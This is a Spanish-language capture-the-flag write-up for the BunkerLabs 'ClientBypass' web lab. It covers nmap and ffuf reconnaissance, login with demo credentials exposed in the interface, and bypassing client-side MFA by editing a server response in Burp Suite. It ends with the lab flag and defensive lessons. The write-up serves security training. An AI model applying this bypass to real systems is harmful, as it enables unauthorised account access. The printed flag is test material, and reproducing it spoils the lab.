---
tags:
  - CTF
  - writeup
  - bunkerlabs
  - web
  - mfa-bypass
  - client-side
dificultad: "⭐ Muy fácil"
sistema: "Web — Uvicorn (FastAPI)"
ip: "172.17.0.2"
técnicas:
  - Enumeración de directorios
  - Bypass de MFA del lado del cliente
  - Manipulación de respuesta con Burp Suite
fecha: 2026-06-13
estado: "✅ Completada"
---

# 🖥️ Máquina: ClientBypass (BunkerLabs)

> [!info] Información general
>
> - **Plataforma:** BunkerLabs
> - **Dificultad:** Muy fácil
> - **Stack:** Uvicorn / FastAPI
> - **IP objetivo:** `172.17.0.2`
> - **Técnicas:** Enumeración de endpoints · Bypass de autenticación de doble factor (MFA) manipulando la respuesta del servidor

---

## 🗺️ Flujo del ataque

```
Ping → Nmap (8000/http - Uvicorn) → Enumeración con ffuf → /login
→ Credenciales demo → MFA → Bypass MFA con Burp Suite → /dashboard
```

---

## 1️⃣ Reconocimiento

### Verificación de conectividad

```bash
ping 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.061 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.059 ms
```

> [!tip] TTL = 64 → Sistema Linux confirmado

---

### Escaneo de puertos con Nmap

```bash
nmap -p- -sS -sSV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

**Resultado:**

|Puerto|Estado|Servicio|Versión|
|---|---|---|---|
|8000/tcp|open|HTTP|Uvicorn|

> [!note] Uvicorn es un servidor ASGI usado comúnmente para correr aplicaciones **FastAPI** en Python. Esto sugiere que la app tendrá rutas de API documentadas (`/docs`, `/redoc`).

---

## 2️⃣ Enumeración web

### Petición inicial

```bash
curl -i http://172.17.0.2:8000
```

```
HTTP/1.1 307 Temporary Redirect
location: /login
```

La raíz redirige automáticamente a una página de login que muestra credenciales de demostración directamente en la interfaz: **`admin / password123`**.

> [!warning] Esto ya es un fallo de configuración grave: exponer credenciales de acceso en producción.

---

### Fuzzing de directorios con ffuf

```bash
ffuf -w ~/Desktop/Lists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt:FUZZ \
  -u http://172.17.0.2:8000/FUZZ -r -v -ac
```

**Endpoints encontrados:**

|Endpoint|Status|Descripción|
|---|---|---|
|`/login`|200|Formulario de inicio de sesión|
|`/docs`|200|Documentación interactiva de FastAPI (Swagger)|
|`/dashboard`|200|Panel protegido (requiere sesión)|
|`/redoc`|200|Documentación alternativa de la API|
|`/mfa`|200|Verificación de doble factor|

> [!note] `/docs` y `/redoc` confirman que la app está construida con FastAPI, expuesta sin restricciones.

---

## 3️⃣ Explotación

### Camino directo — Login con credenciales demo

Usando las credenciales mostradas en la propia interfaz (`admin / password123`), se accede directamente al panel saltando a /dashboard:

```
Security Flag: OHGDS8FOG8
```

> [!success] Acceso al dashboard logrado simplemente usando las credenciales de demo expuestas en el login y saltando a /dashboard.

---

### Camino alternativo — Bypass de MFA

Tras autenticarse con las credenciales demo, la aplicación solicita un código de verificación de doble factor (MFA).

Se envía un código **incorrecto** (`123456`) mientras se intercepta la petición con **Burp Suite**.

**Respuesta original del servidor:**

```http
HTTP/1.1 200 OK
content-type: application/json

{"success":false,"message":"Invalid MFA code"}
```

> [!danger] La validación del código MFA ocurre **del lado del cliente**, basándose en el campo `success` de la respuesta JSON. El servidor responde con `200 OK` incluso cuando el código es incorrecto, dejando la decisión de "pasar" o "no pasar" completamente en manos del frontend.

---

### Manipulación de la respuesta

Con Burp Suite, se intercepta la respuesta y se cambia el valor `false` por `true`:

```http
HTTP/1.1 200 OK
content-type: application/json

{"success":true,"message":"Invalid MFA code"}
```

> [!success] El frontend interpreta `success: true` y redirige al `/dashboard`, otorgando acceso completo a pesar de que el código MFA introducido era incorrecto.

```
Security Flag: OHGDS8FOG8
```

---

## ✅ Resumen

|Paso|Detalle|
|---|---|
|Vulnerabilidad|Validación de MFA del lado del cliente|
|Credenciales|`admin / password123` (expuestas en el login)|
|Herramienta clave|Burp Suite (interceptar y modificar response)|
|Resultado|Bypass total del segundo factor de autenticación|
|Flag|`OHGDS8FOG8`|

---

## 🔍 Lecciones aprendidas

> [!danger] Malas prácticas identificadas
>
> - **Credenciales de demo expuestas** en producción/práctica directamente en el HTML.
> - **MFA validado del lado del cliente** — el servidor nunca debe confiar en el frontend para decidir si el código es correcto; la sesión solo debe otorgarse tras una verificación server-side.
> - **Respuesta HTTP 200 para códigos inválidos** — debería devolver un código de error (401/403) que el cliente no pueda manipular para alterar el flujo de autenticación.

---

## 📚 Referencias

- [Burp Suite — Intercepting Proxy](https://portswigger.net/burp)
- [OWASP — Testing for Weak Lock Out Mechanism / MFA](https://owasp.org/www-project-web-security-testing-guide/)
- [FastAPI / Uvicorn](https://fastapi.tiangolo.com/)